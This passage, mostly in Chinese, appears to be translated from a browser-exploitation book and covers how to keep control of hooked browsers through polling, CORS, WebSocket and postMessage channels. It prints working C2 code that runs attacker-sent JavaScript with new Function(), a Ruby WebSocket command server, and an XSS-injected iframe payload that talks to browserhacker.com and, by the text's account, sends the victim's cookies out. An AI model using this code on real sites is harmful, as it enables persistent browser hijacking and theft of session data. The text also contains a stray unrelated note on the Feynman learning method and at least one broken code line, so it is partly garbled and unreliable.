
Retaining control of your target is trickier than just executing your initial instructions. Unless you’re able to somehow inject code into every page, you will lose control when the target navigates away. Ideally, retaining your control over a browser should take place not only in the face of network disconnections, but regardless of what sites the user may be visiting.

- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者`Richard Feynman`。

1. 运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。

```
if (condVar > someVal) {console.log("xxx")}
```

- [闭包非常适合用于添加新的动态代码，因为在闭包内部声明的私有变量（使用 `var` 声明）隐藏在全局作用域之外。使用闭包，你可以将环境数据与在该数据上运行的函数关联起来。]

- 如果你多次提交前面的代码，将其逻辑封装进闭包是强制性的，以“隔离”新代码到其自身的函数中。按照 BeEF 的分类学，剩余的示例被称为 **command modules**（命令模块），因为它们是浏览器可以执行的新命令。

- 闭包的概念可以扩展，用于创建一个包装器，向堆栈中添加命令模块。每当轮询请求完成后，`stack.pop()` 确保移除堆栈的最后一个元素，然后执行该元素。

- 下面的代码是该思路的样本实现。为了简洁，锁对象和 `poll()` 函数已被排除：

```
 /**
 * 命令堆栈。
 */
`commands`: new `Array()`,

/**
 * 包装器。将命令模块压入命令堆栈。
 */
`execute`: function(`fn`) {
  this.`commands`.push(`fn`);
},

/**
 * 轮询操作。如果响应不为 0，则调用 execute_commands()
 */
`get_commands`: function() {
try {
  this.`lock` = true;
  // 向 server_host 轮询新命令
  poll(`server_host`, function(response) { 
   if (response.body != null && response.body.length > 0)
    execute_commands();
  });
  } catch(e){
    this.`lock` = false;
    return;
  }
  this.`lock` = false;
},

/**
 * 执行收到的命令（如果有）。
 */
`execute_commands`: function() {
  if(`commands`.length == 0) return;
  this.`lock` = true;
  while(`commands`.length > 0) {
   `command` = `commands`.pop();
     try {
    `command`();
     } catch(e) {
       console.error(.message);
     }
  }
  this.`lock` = false;
}
```

- 如 `execute_commands()` 函数所示，如果命令栈不为空，每个条目都会被弹出并执行。可以在 `try` 块内部调用 `command()`，因为闭包使得命令模块被封装在自己的匿名函数中：

```
execute(function() {
var msg = "What is your password?";
  prompt(msg);
});
```

- 当函数在运行时动态声明而没有具体名称时，它被称为 **匿名函数**。这些函数在需要执行一次性的小段代码时非常有用，尤其是该代码只在一个地方使用。该概念常用于向事件处理器注册匿名函数，例如：

```
aButton.addEventListener('click',function(){alert('you clicked me');},false);
```

- 当前面的命令模块被加载到目标浏览器的 DOM 中后，`execute()` 包装器会被调用，随后在命令堆栈上会出现如下的新 JavaScript 代码层：

```
function() {
var msg = "What is your password?";
  prompt(msg);
}
```

- 最终，当 `commands.pop()` 执行并尝试运行弹出的代码时，会弹出一个提示框，显示 `msg` 的内容。

- 从样本实现代码中可以清楚地看到，`commands` 数组被实现为 **栈**（后进先出，LIFO）结构。你可能会疑惑为何不使用 **队列**（先进先出，FIFO）结构。这是一个合理的问题，主要取决于你的需求。如果需要在命令模块之间建立关联，使得后续模块的输入依赖于前一个模块的输出，则 FIFO 结构可能更合适。

## 使用跨源资源共享 (CORS)

CORS 允许 Web 应用通过稍微扩展同源策略 (SOP) 指定可以读取 HTTP 响应的不同来源。这对于想要让中央攻击服务器与访问不同来源的浏览器进行通信时特别有用。

BeEF 服务器通过以下附加 HTTP 响应头实现此功能，允许来自任何来源的跨源 POST 和 GET 请求：

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: POST, GET
```

当使用 `XMLHttpRequest` 对象发送跨源 GET 请求时，如果目标源返回了上述头部，则可以完整读取 HTTP 响应。如果这些 CORS 头部未包含，同源策略会阻止 `XMLHttpRequest` 读取完整响应。

与任何规范一样，CORS 也存在实现 quirks。例如，Internet Explorer 直到第 10 版才提供完整支持，Opera Mini 完全不支持。IE 8 和 9 通过 `XDomainRequest` 对象部分支持 CORS，但这引入了以下限制：

* 仅完全支持 `http` 和 `https` 方案。

* 不允许自定义请求头。

* `content-type` 默认是 `text/plain`，且不能被覆盖。

* 无法发送 Cookie 和其他身份验证请求头。

使用 CORS 作为通信通道是一种有效的方式，用于维持被钩住浏览器与服务器之间的持续关系。但有时你可能希望使用更快的通道，例如 **WebSocket** 协议。下一节将探讨这一点。

## 使用 WebSocket 通信

WebSocket 协议是一种非常快速的全双工通信通道。它能够在无需显式轮询服务器的情况下，实现强事件驱动的行为。这并不意味着你可以完全抛弃内部的轮询机制——根据你的需求和通信架构的设计，保留某种形式的轮询可能会带来好处。

WebSocket API 是 Comet 等 AJAX 推送技术（如长轮询）的替代。Comet 需要额外的客户端库，而 WebSocket API 原生内置于现代浏览器中。正如图 3-2 所示，所有最新浏览器（包括 Internet Explorer 10）都原生支持 WebSocket 协议。唯一的例外是部分移动浏览器，如 Opera Mini 和 Android 原生浏览器。

start figure 

**Figure 3-2:** WebSocket 协议支持情况（常见浏览器）

![c03f002.tif](img/c03f002.png)

end figure 

各种项目致力于为不支持 WebSocket 的浏览器添加兼容性。其中一个较为著名的项目是 **Socket.io**。Socket.io 仍然依赖客户端 JavaScript 库，但通过在运行时选择最佳传输方式，提供可靠的连接。Socket.io 支持的通道包括 WebSocket 协议、Adobe Flash Sockets、AJAX 长轮询以及 JSONP 轮询。

下面的代码展示了一个非常简单的 Ruby Web 服务器与被钩住浏览器之间的通信示例。该 Ruby WebSocket 服务器基于 **EM-WebSocket** 库（或 gem）实现，它是一个基于 EventMachine 的异步且高速实现：

```
require 'em-websocket'
EventMachine.run {
EventMachine::WebSocket.start(
 :host => "0.0.0.0",
 :port => 6666, 
 :secure => false) do |ws|
   begin
   ws.onmessage do |msg|
      p "Received:"
      p "->#{msg}"
      ws.send("alert(1);")
   end
   rescue Exception => e
      print_error "WebSocket error: #{e}"
   end
end
}
```

该代码段在 6666 端口绑定 WebSocket 服务器，等待客户端发送新消息。收到消息后，会向客户端发送一个新命令。你会发现这与前文的 `XMLHttpRequest` 示例相似：都使用了匿名函数 `function(){alert(1)}`。为了简化，这里没有使用之前的 `execute()` 包装器和闭包，但如果需要，这段代码可以轻松地改造以支持闭包方式的执行。

客户端代码使用原生 WebSocket API 编写。当 WebSocket 通道打开时，客户端会向服务器发送消息，请求更多指令。当服务器回复时，onmessage 事件会被触发，服务器发送的数据会被执行，从而创建一个新的 Function 对象。通过 WebSocket 通道传输的数据可以是 String、Blob 或 ArrayBuffer 类型。在此情况下，类型为 String，这意味着代码需要通过 new Function() 实例化后进行评估。我们假设攻击服务器和发送的 JavaScript 代码是默认受信任的，因此使用 Function 这种方式比使用 eval 更安全。

```
var socket = new WebSocket("ws://browserhacker.com:6666/");
socket.onopen = function(){
  console.log("Socket open.");
  socket.send("Server, send me commands.");
}  
socket.onmessage = function(msg){
  f = new Function(msg.data);
  f();
  console.log("Command received and executed.");
} 
```

如您在 Figure 3-2 所见，并非所有浏览器都原生支持 WebSocket API。假设默认使用 XMLHttpRequest 对象作为默认通信通道以支持更多浏览器，但您想将特定通道升级为使用 WebSocket 协议。首先，您需要确定 WebSocket 协议是否受支持。要验证其受支持，需要对浏览器的能力进行指纹识别。关于实现准确且全面的浏览器指纹识别的各种技术在第 6 章的 “Fingerprinting Browsers” 部分有所讨论；不过，您可以通过以下代码检查 WebSocket API 或 Mozilla 的 MozWebSocket 是否受支持：

```
hasWebSocket: function() {
  return !!window.WebSocket || !!window.MozWebSocket;
},
```

如果返回 true，则您可以在 JavaScript 中使用 WebSocket 协议。MozWebSocket 对象与 WebSocket 对象类似，由 Mozilla 在某些较旧的 Firefox 版本（版本 6 到 10）中通过前缀添加。标准 WebSocket 对象在 Firefox 版本 11 及以上无需添加前缀即可使用。

## 使用消息传递通信

如第 1 章所介绍，window.postMessage() 是另一种原生方法，用于实现跨源通信，同时遵守同源策略（SOP）。使用该方法需要进行初始化；首先，您需要在攻击服务器（本例为 browserhacker.com）上托管一个 IFrame 的内容：

```
<html>
<body>
<b>Embed me on a different origin</b>
<div id="debug">Ready to receive data...</div>
 <script>
     window.addEventListener("message", receiveMessage, false);
     function doClick() {
         parent.postMessage("Message sent from " + location.host,
           "http://browservictim.com");
     }
     var debug = document.getElementById("debug");
     function receiveMessage(event) {
         debug.innerHTML += "Data: " + event.data + "\n Origin: " +
          event.origin;
         parent.postMessage("alert(1)", event.origin);
     }
 </script>
</body>
</html>
```

接下来，您需要利用目标站点（假设为 browservictim.com）的 XSS 漏洞进行攻击，注入的 payload 需要包含 JavaScript 逻辑以及 IFrame 本身。创建的 IFrame 加载前面的代码片段。请注意，这里涉及 to_server IFrame 以及 post_msg() 和 receiveMessage() 函数：

```
<div id="debug"> </div>
  <div id="ui">
    <input type="text" id="v" />
    <input type="button" value="Send to server" onclick="post_msg();" />
    <iframe id="to_server"
     src="http://browserhacker.com/postMessage_server.html"></iframe>
   </div>
  <script type="text/javascript">
  window.addEventListener("message", receiveMessage, false);

  var infoBar = document.getElementById("debug");
  function receiveMessage(event) {
    infoBar.innerHTML += event.origin + ": " + event.data + "";
    new Function(event.data)();
  }

  function post_msg(domain) {
        var to_server = document.getElementById("to_server");
        to_server.contentWindow.postMessage("" + 
          eval(document.getElementById("v").value), 
            "http://browserhacker.com");
  }        
  </script>
```

如您在 Figure 3-3 所见，browservictim.com 域的 cookie 会被发送到 browserhacker.com，如图 3-3 所示。

 start figure 

**Figure 3-3:** Breakpoint on the framed attacker’s code

![c03f003.eps](img/c03f003.png)

 end figure 

代码从 browserhacker.com 加载后，会接收来自不同源的数据，并回复额外的 JavaScript 代码，这些代码在 browservictim.com 上通过 new Function 创建后被评估。在前面的代码示例中，发送的简单 alert(1) 如 Figure 3-4 所示。

 start figure 

**Figure 3-4:** The response is evaluated and the JavaScript is executed

![c03f004.tif](img/c03f004.png)

 end figure 

window.postMessage() 可以用于在不同窗口之间（如 IFrames、弹窗、pop‑under、标签页）进行通信。正如预期，各浏览器存在一些 quirks。在 Internet Explorer 8 及以上版本，window.postMessage() 只能用于 IFrames，而不能用于其他标签页或窗口。关于 postMessage() 跨浏览器支持情况的概览，请参见 Figure 3-5。

 start figure 
